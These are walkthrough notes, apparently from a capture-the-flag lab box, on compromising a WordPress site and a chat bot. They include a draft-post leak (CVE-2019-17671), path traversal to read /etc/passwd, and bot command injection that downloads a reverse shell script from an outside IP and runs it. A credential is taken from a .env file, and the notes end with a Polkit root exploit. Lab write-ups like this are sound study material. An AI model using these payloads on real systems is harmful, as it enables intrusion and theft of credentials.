## Credential


## Path
### User
1. `mod_fcgid` is FastCGI. After test, `/cgi-bin/` returns 403 Forbidden, which means CGI program exists.
2. Found HTTP header `X-Backend-Server: office.paper`, so set `office.paper` as hostname in `/etc/hosts`. Then visit `office.paper`.
3. Wordpress users: `nick`, `Prisonmike`
3. `/index.php/wp-json/` is the API endpoint of Wordpress, worth to take a look.
4. See some pages that not shown on `http://office.paper/index.php/wp-json/wp/v2/pages` by examining the API.
5. From the hint in the published posts and the result of `wpscan`, I found this vuln leak the draft by visiting `http://office.paper/?static=1`. And it reveals a chat service register page.
```
$ cat wordpress/wpscan-api.out
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 5.2.4
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/

$ curl http://office.paper/?static=1
<p>http://chat.office.paper/register/8qozr226AhkCHZdyY</p>
```
6. From the conversation in the chat, we can send `recyclops file ../../../../../../../../../etc/passwd` to read files on the box, use `recyclops list ..` for `ls`
7. Use `recyclops run {cat,/etc/passwd}` to execute command.
```
recyclops run {wget,10.10.17.233:8000/rev.sh}
recyclops run {sh,./rev.sh}
```
8. The password of `dwight` is in `/home/dwight/hubot/.env`.

### Root
1. CentOS 8 is vulnerable to [CVE-2021-3560](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation), so run the script and get root.
